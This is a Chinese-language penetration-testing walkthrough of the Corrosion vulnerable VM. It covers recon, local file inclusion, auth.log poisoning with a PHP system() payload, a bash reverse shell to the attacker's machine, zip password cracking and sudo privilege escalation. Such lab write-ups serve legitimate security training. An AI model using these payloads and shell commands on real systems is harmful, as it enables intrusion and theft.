# 0 - 靶机部署
> ❕ 注意
> ---
> 此处 `仅适用` 于 `没有安装eNSP的设备`  
> 这里使得**你的kali与靶机处于同一网卡**，并**正常获得IP**  
> `如果` 你的VMware正常可以修改靶机配置与启动， `0-靶机部署` **不用看**  

- 由于我的VMware版本过高，但Corrosion靶机过于古早，并不兼容，所以此处我使用VirtualBox部署靶机  
- `如果` 使用这种方法，Kali虚拟机需要添加一张新的网卡，为 `桥接模式`

<p align="center">
  <img src="/EXAM/img/2/1-VirtualBox.png" width="50%">
</p>
<p align="center"><em>图0-1 VirtualBox</em></p>

> ❕ 注意
> ---
> 使用VirtualBox需要与VMware网卡互通，具体步骤如下：
> `VirtualBox` 使用HostOnly网卡，`VMware` 使用桥接网卡  
> 使得VMware网卡桥接到VirtualBox的HostOnly网卡，实现网络互通，如 `图0-2~4` 所示：
<p align="center">
  <img src="/EXAM/img/1/2-VMware虚拟网络适配器.png" width="50%">
</p>
<p align="center"><em>图0-2 VMware虚拟网络适配器</em></p>

<p align="center">
  <img src="/EXAM/img/1/3-VirtualBox网卡.png" width="50%">
</p>
<p align="center"><em>图0-3 VirtualBox网卡</em></p>

<p align="center">
  <img src="/EXAM/img/1/4-VirtualBox机器配置.png" width="50%">
</p>
<p align="center"><em>图0-4 VirtualBox机器配置</em></p>

# 1 - 信息收集
### Nmap
这里我们先使用nmap进行主机探活：  
```
nmap -sn <你的kali与靶机同一网卡的网段>/24 
```
<p align="center">
  <img src="/EXAM/img/2/2-nmap探活.png" width="50%">
</p>
<p align="center"><em>图1-1 nmap探活</em></p>

简单排除，不难发现靶机的IP  
接下来我们来探测靶机开放的端口：  
```
nmap -sV -p- <靶机IP>
```
<p align="center">
  <img src="/EXAM/img/2/3-nmap扫开放端口.png" width="50%">
</p>
<p align="center"><em>图1-2 nmap扫描开放端口</em></p>

注意到靶机开放了 `22` 、 `80` 端口  
不妨尝试访问一下：
<p align="center">
  <img src="/EXAM/img/2/4-访问web.png" width="50%">
</p>
<p align="center"><em>图1-3 访问web</em></p>

发现使用了Apache，但是并无大用  

### Dirsearch
这个工具默认并没有安装，所以需要先安装一下：
```
apt install dirsearch 
```
安装后需要先修改一下词典：
```
vim /usr/lib/python3/dist-packages/dirsearch/db/dicc.txt
```
往文件头部添加如下字段：
```
blog-post/
index.html
```
键入如下指令进行扫描
```
dirsearch -u <靶机IP>
```
结果如下：
<p align="center">
  <img src="/EXAM/img/2/5-dirsearch扫描.png" width="50%">
</p>
<p align="center"><em>图1-4 dirsearch扫描</em></p>

但其实打开这个网页之后并没有发现什么可用的信息，所以我们进一步收集：
```
dirsearch -u http://<靶机IP>/blog-post/
```
<p align="center">
  <img src="/EXAM/img/2/6-进一步扫描目录.png" width="50%">
</p>
<p align="center"><em>图1-5 进一步扫描目录</em></p>

发现了两个可能有用的目录：
- http://靶机IP/blog-post/archives/
- http://靶机IP/blog-post/uploads/

依次访问，发现 `http://靶机IP/blog-post/archives/` 上有个php  
我们尝试任意文件读取漏洞，在浏览器搜索框键入：
```
http://靶机IP/blog-post/archives/randylogs.php?file=/etc/passwd
```
<p align="center">
  <img src="/EXAM/img/2/7-尝试任意文件读取漏洞.png" width="50%">
</p>
<p align="center"><em>图1-6 尝试任意文件读取漏洞</em></p>

尝试把passwd改成shadow，发现返回空，基本可以确定是权限不足
> 这里正常来说是要先用 `fuzz` 跑参数，不过直接加参数 `file` 尝试也是可以的  
> 如果想拓展一下，可以看下面：
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-u "http://靶机ip/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" \
-fs 0
```
> 这里就会扫出来具体的参数。  
> 不想拓展就跳过这段

# 2 - 漏洞利用
> 我们这里kali版本普遍偏高  
> 所以自带的ssh版本显然也偏高，课本上给出的方法在SSH9.6之后就不适用了  
> 因为openssh更新了一个安全补丁，不允许有特殊符号，转义也不行

我们这里引入一个新的方法：
```
nc <靶机IP> 22
<?php system($_GET["123"]);?>
```
然后访问：
```
http://<靶机IP>/blog-post/archives/randylogs.php?file=/var/log/auth.log&123=bash -c 'bash -i >%26 /dev/tcp/<kali的IP>/7777 0>%261'
```
<p align="center">
  <img src="/EXAM/img/2/8-反弹Shell.png" width="50%">
</p>
<p align="center"><em>图2-1 反弹Shell</em></p>

然后就拿到了反向Shell
<p align="center">
  <img src="/EXAM/img/2/9-获得反弹Shell.png" width="50%">
</p>
<p align="center"><em>图2-2 获得反弹Shell</em></p>

# 3 - 获得密码
我们在反向Shell里随便逛逛  
~~不经意间~~看到了`/var/backups/user_backup.zip`  
不妨用curl下载下来：
```
curl <靶机IP>/blog-post/archives/randylogs.php?file=/var/backups/user_backup.zip -o user_back-up.zip
```
发现zip有密码，下载并使用fcrackzip：
```
sudo apt install fcrackzip
sudo gunzip /usr/share/wordlists/rockyou.txt.gz     # 如果发现只有txt.gz，就输入这行命令解压一下
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u user_back-up.zip
```
<p align="center">
  <img src="/EXAM/img/2/10-爆破压缩包.png" width="50%">
</p>
<p align="center"><em>图3-1 爆破压缩包</em></p>

我们获得了压缩包的密码，解压一下，发现了 `my_password.txt`
打开后获得密码：
<p align="center">
  <img src="/EXAM/img/2/11-获得密码.png" width="50%">
</p>
<p align="center"><em>图3-2 获得密码</em></p>

然后就可以登录靶机了
<p align="center">
  <img src="/EXAM/img/2/12-登陆靶机.png" width="50%">
</p>
<p align="center"><em>图3-3 登陆靶机</em></p>

# 4 - 登录后提权
登录后我们先把那会从 `压缩包` 里获得的 `easysysinfo.c` 修改一下  
<p align="center">
  <img src="/EXAM/img/2/14-修改文件.png" width="50%">
</p>
<p align="center"><em>图4-1 修改easysysinfo.c</em></p>

然后甩到靶机的`/home/randy/tools`里  
然后直接cd进去，输入如下命令：
```
cd /home/randy/tools      # 已经cd进去了就不要输入这一行了
mv easysysinfo easysysinfo.bak
gcc easysysinfo.c -o easysysinfo
sudo ./easysysinfo
```
出现这些就成功了：
<p align="center">
  <img src="/EXAM/img/2/13-提权成功.png" width="50%">
</p>
<p align="center"><em>图4-1 提权成功</em></p>

# 🎉 至此，完成渗透